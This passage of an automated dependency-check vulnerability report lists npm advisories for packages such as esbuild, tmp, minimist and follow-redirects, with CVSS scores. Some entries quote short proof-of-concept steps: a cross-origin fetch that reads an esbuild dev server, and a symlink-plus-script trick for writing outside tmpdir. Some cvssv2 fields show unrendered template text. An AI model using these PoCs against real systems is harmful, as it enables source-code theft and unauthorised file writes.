Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https:\/\/github.com\/socketio\/engine.io)\n\nThanks to [Jonathan Neve](https:\/\/github.com\/jonathanneve) for the responsible disclosure.\n"},"help": {"text": "","markdown": "For more information see [GHSA-r7qp-cfhv-p84w](https://github.com/advisories/GHSA-r7qp-cfhv-p84w)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-76p3-8jx3-jpfq","shortDescription": {"text": "critical severity - GHSA-76p3-8jx3-jpfq Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/loader-utils@1.4.0"},"fullDescription": {"text": "Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils prior to version 2.0.3 via the name variable in parseQuery.js."},"help": {"text": "","markdown": "For more information see [GHSA-76p3-8jx3-jpfq](https://github.com/advisories/GHSA-76p3-8jx3-jpfq)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-hhq3-ff78-jv3g","shortDescription": {"text": "high severity - GHSA-hhq3-ff78-jv3g Uncontrolled Resource Consumption vulnerability in pkg:npm\/loader-utils@1.4.0"},"fullDescription": {"text": "A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1."},"help": {"text": "","markdown": "For more information see [GHSA-hhq3-ff78-jv3g](https://github.com/advisories/GHSA-hhq3-ff78-jv3g)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-67mh-4wv8-2f99","shortDescription": {"text": "medium severity - GHSA-67mh-4wv8-2f99 Origin Validation Error vulnerability in pkg:npm\/esbuild@0.14.22"},"fullDescription": {"text": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps:\/\/github.com\/evanw\/esbuild\/blob\/df815ac27b84f8b34374c9182a93c94718f8a630\/pkg\/api\/serve_other.go#L121\nhttps:\/\/github.com\/evanw\/esbuild\/blob\/df815ac27b84f8b34374c9182a93c94718f8a630\/pkg\/api\/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http:\/\/malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http:\/\/127.0.0.1:8000\/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http:\/\/127.0.0.1:8000\/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `\/index.html`: normally you have a script tag here\n- Fetching `\/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `\/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('\/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18561484\/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http:\/\/127.0.0.1:8000\/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites."},"help": {"text": "","markdown": "For more information see [GHSA-67mh-4wv8-2f99](https://github.com/advisories/GHSA-67mh-4wv8-2f99)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-xvch-5gv4-984h","shortDescription": {"text": "critical severity - GHSA-xvch-5gv4-984h Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/minimist@1.2.5"},"fullDescription": {"text": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95)."},"help": {"text": "","markdown": "For more information see [GHSA-xvch-5gv4-984h](https://github.com/advisories/GHSA-xvch-5gv4-984h)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2023-26159","shortDescription": {"text": "medium severity - CVE-2023-26159 Improper Input Validation vulnerability in pkg:npm\/follow-redirects@1.14.9"},"fullDescription": {"text": "Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.099999904632568,"security-severity": "6.099999904632568","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2022-37603","shortDescription": {"text": "high severity - CVE-2022-37603 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/loader-utils@1.4.0"},"fullDescription": {"text": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2021-44906","shortDescription": {"text": "critical severity - CVE-2021-44906 Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/minimist@1.2.5"},"fullDescription": {"text": "Minimist <=1.2.5 is vulnerable to Prototype Pollution via file index.js, function setKey() (lines 69-95)."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-52f5-9888-hmc6","shortDescription": {"text": "low severity - GHSA-52f5-9888-hmc6 Improper Link Resolution Before File Access ('Link Following') vulnerability in pkg:npm\/tmp@0.2.1"},"fullDescription": {"text": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file \/ directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir \/\/<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https:\/\/github.com\/raszi\/node-tmp\/issues\/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/lib\/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n\/\/ https:\/\/github.com\/raszi\/node-tmp\/blob\/v0.2.3\/lib\/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    \/\/ assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    \/\/ must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { \/\/ if (option === 'dir' || option === 'template') {\n    \/\/ assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); \/\/<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME\/mydir1\n\nln -s $HOME\/mydir1 ${TMPDIR:-\/tmp}\/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME\/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  \/tmp\/evil-dir\/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '\/tmp\/mydir1\/tmp-[random-id]'\ntest 2: dir option must be relative to \"\/tmp\", found \"\/foo\".\ntest 3: dir option must be relative to \"\/tmp\", found \"\/home\/user\/mydir1\".\n```\n\n- the temporary file is created under `$HOME\/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME\/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n\/\/ npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '\/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('\/tmp\/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file \/ directory write via symlink"},"help": {"text": "","markdown": "For more information see [GHSA-52f5-9888-hmc6](https://github.com/advisories/GHSA-52f5-9888-hmc6)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 2.5,"security-severity": "2.5","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "LOW","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2021-43138","shortDescription": {"text": "high severity - CVE-2021-43138 Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/async@2.6.3"},"fullDescription": {"text": "In Async before 2.6.4 and 3.x before 3.2.2, a malicious user can obtain privileges via the mapValues() method, aka lib\/internal\/iterator.js createObjectIterator prototype pollution.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2021-43138 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.800000190734863,"security-severity": "7.800000190734863","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-7fh5-64p2-3v2j","shortDescription": {"text": "medium severity - GHSA-7fh5-64p2-3v2j Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') vulnerability in pkg:npm\/postcss@8.4.5"},"fullDescription": {"text": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r\/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment."},"help": {"text": "","markdown": "For more information see [GHSA-7fh5-64p2-3v2j](https://github.com/advisories/GHSA-7fh5-64p2-3v2j)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-38355","shortDescription": {"text": "medium severity - CVE-2024-38355 Improper Input Validation vulnerability in pkg:npm\/socket.io@4.4.1"},"fullDescription": {"text": "Socket.IO is an open source, real-time, bidirectional, event-based, communication framework. A specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process. This issue is fixed by commit `15af22fc22` which has been included in `socket.io@4.6.2` (released in May 2023). The fix was backported in the 2.x branch as well with commit `d30630ba10`. Users are advised to upgrade. Users unable to upgrade may attach a listener for the \"error\" event to catch these errors.\n"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.900000095367432,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "CVE-2024-11831","shortDescription": {"text": "medium severity - CVE-2024-11831 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/serialize-javascript@6.0.0"},"fullDescription": {"text": "A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-11831 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 5.099999904632568,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "CVE-2025-5889","shortDescription": {"text": "medium severity - CVE-2025-5889 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/brace-expansion@1.1.11"},"fullDescription": {"text": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11\/2.0.1\/3.0.0\/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is a5b98a4f30d7813266b221435e1eaaf25a1b0ac5. It is recommended to upgrade the affected component."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.0,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "HIGH","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "GHSA-cxjh-pqwp-8mfp","shortDescription": {"text": "medium severity - GHSA-cxjh-pqwp-8mfp Exposure of Sensitive Information to an Unauthorized Actor vulnerability in pkg:npm\/follow-redirects@1.14.9"},"fullDescription": {"text": "When using [axios](https:\/\/github.com\/axios\/axios), its dependency follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too.\n\n## Steps To Reproduce & PoC\n\nTest code:\n\n```js\nconst axios = require('axios');\n\naxios.get('http:\/\/127.0.0.1:10081\/', {\n headers: {\n 'AuThorization': 'Rear Test',\n 'ProXy-AuthoriZation': 'Rear Test',\n 'coOkie': 't=1'\n }\n})\n .then((response) => {\n console.log(response);\n })\n```\n\nWhen I meet the cross-domain redirect, the sensitive headers like authorization and cookie are cleared, but proxy-authentication header is kept.\n\n## Impact\n\nThis vulnerability may lead to credentials leak.\n\n## Recommendations\n\nRemove proxy-authentication header during cross-domain redirect\n\n### Recommended Patch\n\n[follow-redirects\/index.js:464](https:\/\/github.com\/follow-redirects\/follow-redirects\/commit\/c4f847f85176991f95ab9c88af63b1294de8649b)\n\n```diff\n- removeMatchingHeaders(\/^(?:authorization|cookie)$\/i, this._options.headers);\n+ removeMatchingHeaders(\/^(?:authorization|proxy-authorization|cookie)$\/i, this._options.headers);\n```"},"help": {"text": "","markdown": "For more information see [GHSA-cxjh-pqwp-8mfp](https://github.com/advisories/GHSA-cxjh-pqwp-8mfp)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-25858","shortDescription": {"text": "high severity - CVE-2022-25858 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/terser@5.10.0"},"fullDescription": {"text": "The package terser before 4.8.1, from 5.0.0 and before 5.14.2 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure usage of regular expressions.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-25858 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-76p7-773f-r4q5","shortDescription": {"text": "medium severity - GHSA-76p7-773f-r4q5 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/serialize-javascript@6.0.0"},"fullDescription": {"text": "A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package."},"help": {"text": "","markdown": "For more information see [GHSA-76p7-773f-r4q5](https://github.com/advisories/GHSA-76p7-773f-r4q5)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.400000095367432,"security-severity": "5.400000095367432","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-37601","shortDescription": {"text": "critical severity - CVE-2022-37601 Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/loader-utils@1.4.0"},"fullDescription": {"text": "Prototype pollution vulnerability in function parseQuery in parseQuery.js in webpack loader-utils 